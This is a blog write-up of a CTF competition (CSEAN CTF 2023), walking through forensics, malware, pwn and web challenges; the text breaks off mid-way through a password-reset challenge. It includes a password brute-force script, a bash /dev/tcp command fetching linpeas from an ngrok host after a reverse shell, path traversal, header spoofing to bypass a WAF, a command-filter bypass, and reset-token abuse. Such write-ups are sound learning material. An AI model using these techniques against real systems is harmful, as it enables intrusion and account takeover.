<h3> CSEAN CTF 2023 </h3>

### Description: This was a fun ctf I participated and it taught me new things >3

<h3> Challenge Solved: </h3>

## Forensics
-  Communication Is Key

## Malware Analysis
-  Two Way Street

## Misc
-  Welcome! Welcome!

## Pwn
-  ChatterBox

## Web
- Play By EAR 
- Enum Enum 
- FirstOfWAF  
- Handover
- Report Phish 
- Stupid Reset
- Handover 2


### Forensics 1/1:~

#### Communication Is Key
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5e2a7a4f-40a9-44c6-b0c2-48a00ebf1d39)

After downloading the attached file checking the file type shows that it is a windows executable
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/38f3d7e1-a260-4a34-bcd6-713f82f383b4)

I normally would try decompile it in ghidra but I don't like decompilling .exe file in ghidra 

So instead what I did was to run it

Doing that I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0e868522-6cf0-45ed-9bbc-c025f7587896)

From the challenge name `communication` it is likely making some sort of requests 

So confirm that I opened wireshark then listened on all network interface
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5ddbf73a-26a9-4def-8b27-755ea49f2e1d)

Then I ran the binary again and got this 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b51361d1-2c72-4296-87f0-d789b6b1a25a)

There are http packets

I followed tcp stream and got the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6a7f6316-899c-4db6-8296-31b503929c35)

Also this binary is a python compiled binary

We can either confirm this by decompilling it or from the user agent we can see it's python2.8

Anyways since we got the flag what's the use of going through that

```
Flag: csean-ctf{CommunicationIsKey_NO_DOUBts!}
```

### Malware Analysis 1/1 :~

#### Two Way Street 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e14da56-e726-4b2e-a2e7-01b80b52c0a3)

I am not a Malware Person but luckily this wasn't tough

First thing I did was to check the file type
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/14bd9c92-644e-4f09-b48c-70ba48d3993d)

A windows executable

I uploaded it in [virus total](https://www.virustotal.com/gui/home/upload) 

And on checking the details I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e14ded4d-0318-4444-b78d-7dcba8b3e98b)

It's also a python compiled binary

Next thing is to convert it to a `.pyc` file then decompile the `.pyc` 

To convert it to a `.pyc` file I used [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) 

Here's the resource that helped me out [hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/.pyc) 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/80d555e4-769d-4c78-a77c-ca8898f08f0a)

Now I will use [uncompyle6](https://pypi.org/project/uncompyle6/) to decompile it

```r
uncompyle6 client.pyc > client.py
```

Doing that gives me this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/592012df-889d-4529-9ffd-b4a5700bf80b)

```python
from pwn import *
import platform
import subprocess
content.log_level = 'warning'

def send_command(host, port, command):
    conn = recvuntil(host, port)
    conn.recvuntil(b'$> ')
    conn.sendline(b'' _ command.encode())
    output = conn.recv(10240).decode().strip()
    conn.close()
    return f'''{output}'''

host = '0.cloud.chals.io'
port = 21440
command = 'hostname'
response = send_command(host, port, command)
note = 'Congratulations! You have been hacked. Now you are part of our mighty and growing botnets'
response = response.split('\n')[:-2]
response = '\n'.join(response)
print(response)
```

We can see that this script basically executes command on this remote instance `0.cloud.chals.io` running on port `21440`

I connect to it and it showed this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ad1f41d9-48a5-40b5-8e71-27f3a31576b6)

I tried catting the flag but got this error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d7ffd688-6429-42ab-979b-578d2e9cad50)

Seems to filter that

But it was easily bypassable 

Since `ls` isn't filtered I did this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/57cefcd7-ac06-4c29-936b-bbb62f241eca)

The commands will execute if an allowed command is also used

I checked the source and got the allowed commands

```python
allowed_commands = ["curl", "wget", "hostname", "date", "ls", "whoami"]
```

If we assume that an intensive filter check is used we can still get the flag since we have access to `curl` 

Basically using `file` wrapper
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/102972b9-6eaa-4181-985a-6a5f2cbb9210)

```
Flag: csean-ctf{when_THE_HACKER_gets_hacked :)}
```

### Misc 1/1:~

#### Welcome! Welcome!
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c44b22fe-1286-4904-b011-91b9ab7e965a)

We are given this string `Y3NlYW4tY3Rme3dlbGNvbWVfdG9fdGhlX2dhbWV6enp6IX0=` and we can tell it's base64 cause of `=` 

Decoding it can be done from the terminal
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/38cf17cb-7e39-4f51-9fa6-51a0f4e1f3c8)

But if I didn't know what it was I would have used [cyberchef](https://gchq.github.io/CyberChef/) or [dcodefr](https://www.dcode.fr/cipher-identifier)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/752ccb44-86c1-4abf-837d-241ff46db2e0)

```
Flag: csean-ctf{welcome_to_the_gamezzzz!}
```

### Pwn 1/1:~

#### ChatterBox [First Blood 🩸]
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6bb8ee28-f7ad-4803-a864-700b9a1e31a2)

This challenge isn't really bianry exploitation in my opinion just more of like scripting

Anyways we are given this:

```
If you ever need to talk, just reach out to any of our employees.

As a side note, we think you should know we like talking in months and days. Hopefully you understand.
```

Connecting to the remote instance shows this prompt
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/29c4cb02-fc71-4e12-9472-98f7bd319d04)

So we are to find a way to access this

I assumed that the username will be `admin` but now for the password how do we go about it?

Well I can always try brute force using a wordlist like rockyou but it might take a while

So back to what the description says :

```
As a side note, we think you should know we like talking in months and days. Hopefully you understand.
```

This is a hint that's based on using months and days

I then make a script to create a wordlist and brute force the password

Here's the script I used to create the wordlist

```
#!/usr/bin/python3

# Hint to how the password should be: As a side note, we think you should know we like talking in months and days. 

# Months
months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
months_upper = [j.upper() for j in months]
months2_lower = [i.lower() for i in months]

# Date
dates = [str(date) for date in range(32)]

# Form the wordlist
wordlist = []

for month in months:
    for date in dates:
        wordlist.append(month + date)

for month in months_upper:
    for date in dates:
        wordlist.append(month + date)

for month in months2_lower:
    for date in dates:
        wordlist.append(month + date)


# Save wordlist
with open('wordlist.txt', 'w') as fd:
    for i in wordlist:
        fd.write(i+'\n')
```

And I used this to brute force 

```python
#!/usr/bin/python3
from pwn import *
import sys
from multiprocessing import Pool as pool
from warnings import filterwarnings

# Set context
context.log_level = 'info'
filterwarnings('ignore')

# Define a function for the brute force >3
def brute_password(password):
    io = remote('0.cloud.chals.io', 33091)
    io.recv(1024) 
    io.sendline(b"admin")
    io.recv(1024)
    io.sendline(password)
    result = io.recv(1024)
    print(result)
    if b"Invalid credentials" not in result:
        print(f'Password: {password}')
        
        
# Read password from the wordlist 
with open('wordlist.txt', 'r') as fd:
    wordlist = fd.readlines()

if __name__ == '__main__':
    start = pool(int('5'))
    start.map(brute_password, wordlist)

# Credential: admin:july10
```

I can now connect to the remote instance
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a553da93-05dc-47b8-ad86-2398837cf7fe)

The Check Operational Status looked interesting

I choose the option and was able to run os commands
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d06426bf-1337-4cb2-ac1c-e64e57bb897b)

At this point I got a reverse shell and uploaded linpeas to the box

But the issue was no binary was available and of cause this is excepted cause we are in a docker container

Using bash I was able to upload linpeas

```
Host: python3 -m http.server 80

Target:-
exec 3<>/dev/tcp/6.tcp.eu.ngrok.io/10577
echo -e "GET /linpeas.sh HTTP/1.1\n\n">&3
cat <&3 > linpeas.sh
```

And when I ran it

```
chmod +x linpeas.sh
bash linpeas.sh
```

I saw the flag in the environment variable
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2270207c-1618-4dd7-bbf2-d6d3f547ffc9)

```
Flag: csean-ctf{SOMETIMES_I_WONDER_HOW_th!s_3v3n_PASSED_BeT4_TEST!}
```

### Web 7/9:~

#### Play By EAR 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5c7638c3-ae39-48ea-99b2-709c3d4c3a67)

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/da1f6ddb-f29b-4441-82dd-1aa8edee1355)

When I input `https://google.com` it gets redirected
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/648527e7-3902-4b79-a980-5c9f07c0d9af)

In order to solve this I intercepted the request and response
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c7d83160-789f-44ba-8a67-6ffeac5b43ca)

Then right click and select `Do intercept -> Reponse to request`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9ea29f83-4ccb-41f9-a130-7f303b3da95e)

```
Flag: csean-ctf{easy_PEASy_REDIrect!}
```

#### Enum Enum [First Blood 🩸]
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2ab15b0b-c8fa-4bef-bf9b-90ad604ae42f)

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/22013b2f-95d7-4d58-88ec-5a70fbfbf007)

Since the challenge name is `Enum` that means we are to enumerate

We can use ffuf to fuzz for `POST` or `GET` request

Doing that got me to `/api` 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6e64b81c-73b6-4abf-8886-dca4c94d1e95)

```
ffuf -c -u https://csean-enum-pain.chals.io/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc all -X POST -fl 11
```

But when I tried fuzzing more values there it just doesn't work

It really frustrated me

Then I decided to use [feroxbuster](https://github.com/epi052/feroxbuster) 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/053c27b2-c187-48ec-ac23-c776bc40c5e2)

```
feroxbuster --url https://csean-enum-pain.chals.io/api/ -X POST
```

Ferobuster got `/api/secret` with `GET` http method

I then accessed it and got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4887099e-eb07-4c3b-94f9-f64de5998694)

Hmmmm! I then tried using `POST` request to access `/api/secret` and it got me the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e4f01421-0269-4fd6-94ba-e827553972d3)

```
Flag: csean-ctf{Y0u_SAW_it_in_4_d!fferent_MeTH0D!!}
```

#### FirstOfWAF
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e7c8851-8a64-4297-b691-bfa765cfc7d5)

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fd50198f-d971-478c-8d61-5ce8e66b0b40)

The text `FORWARDED` was bolden this gives the hint to use the `X-Forwarded-For` header

I used `curl` and added the header to my request then got the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c3b22f9b-aec5-4ba6-8d8c-44a462da83a2)

```
curl -H "X-Forwarded-For: 127.0.0.1" https://csean-waf.chals.io/
```

```
Flag: csean-ctf{NO_PLACE_L!k3_0x7f000001}
```

#### Handover
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d1d6e8ec-d73a-4b6e-8688-74e87ed49124)

To me this challenge was a little bit guessy but ok

Anyways let us get to it

Going over to the web url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/42128a9b-4019-465e-ae07-f618e204b4eb)

When I search for something it gives this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3c5fe403-6c0b-4df3-b982-5b6e06af3ed0)

At this point I was really confused cause I used `cewl` to get the words from the web server and fuzzed for allowed words but got nothing

After some minutes I noticed when I give it `../../../../../flag.txt` it gives the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c05ab17a-57c1-4545-9d5f-8b42a7813893)

```
Flag: csean-ctf{I_hope_i_DIDNT_tr!ck_YOU_OR_D!D_I_hehe:)}
```

#### Report Phish [First Blood 🩸]
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b00464a0-4a7e-4cbb-88f6-ce53d0907e93)

Going over to the url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/18efa1ef-fa76-474a-ad2f-a29b620ca23b)

Seems to be a service used for reporting sites used for phishing

To check if it indeeds make some sort of http request to the site submitted I used [webhook.site](https://webhook.site/) 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/56cc7657-b8bc-4ce0-9804-63594bc853b1)

Submitting that url I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/21f1c96b-293a-44cf-855d-43cff1e343b3)

Then after some minutes of waiting patiently (I didn't wait patiently I sent the request multiple times 😂) I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/414a6d32-090d-4c51-a6c7-8cbe03fce0d5)

The flag is in the referer header

```
Flag: csean-ctf{TH!S_really_l00ks_l!ke_A_PHISH_OR_NOT?} 
```

#### Stupid Reset 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e95dcf7d-0971-4598-95d0-54f2782a18d2)

Going over to the url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f54d7399-f0b2-4aa3-8016-99e314e4c8fb)

There's a sign in and also a register function

I registered an account
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a9a52481-247d-411c-b2a4-6bb26575e10b)

Here's the request made when we register
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3fed8acd-f29f-4390-a362-55f52d8c37c6)

Now I can login
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b49a67d9-a90c-4394-a4f1-931daa321e42)

It redirects to `/dashboard` and shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e1cfcf35-13be-453a-9200-b210d8df0848)

The page source shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6bf751de-1063-4902-822b-2140ccce884d)

That's the js file used by the web server 

Back on the sign in page there's a forgot password function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/db5b797f-2f23-4c98-acc1-3d174f74ed19)

Clicking it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/625bc51c-0de6-44c3-8374-794eb0483cbd)

When I gave in my user created mail `root@sec.io` and also intercepted the request I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0ca0c99c-2c1b-40d6-8401-051f29ff2e2a)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ea62ee2c-47ae-4670-825d-c243f89566b6)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a56df470-b8e0-4c4a-b07a-9a76f168e8c6)

We can see that during the process of the forgot password function, it leaks the token in the response in the json body

How do we take advantage of this since the pop up already said `the reset instruction has been sent to your email address. Kindly click the link within the mail body to initiate the password reset.`

Well I looked back to the `user.js` and saw this endpoint

```js
const resetPassword = () => {
  let current_loc = window.location.href.split("/").pop();
  const data = {
    user: {
      password: document.getElementById("password").value,
    },
  };
  const options = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  };
  fetch(`/api/reset/${current_loc}`, options)
    .then((data) => {
      return data.json();
    })
    .then((response) => {
      window.alert(response.message);
      window.location.href = "/sign-in";
    })
    .catch((e) => {
      window.alert(JSON.stringify(e));
    });
```

Accessing it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cf5434e6-10e3-4025-98e6-b140180d977b)

Looking at it shows that it requires a valid token to be passed in from the url therefore giving us the opportunity to do a password reset

I used the forgot password function to get a token for the user I created `root@sec.io` and did this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/be0578da-508c-44bc-ac11-73cab2812a2f)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/909d6b19-8892-4356-b75c-8341b6c64ebf)

I changed the password to `pwned` and when I logged in it worked
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3a1586fa-d73f-43d3-bf9d-3355b446d320)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f01902e2-9b8e-41e9-bad0-b9d2fd30ce9d)

This means we can basically reset any user password cool right?

At this point I looked at the main page then got a user which looked worth it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dacc3082-1544-4c39-abfe-19b19908bc9e)

Let us reset `admin@stupid-reset.com` 
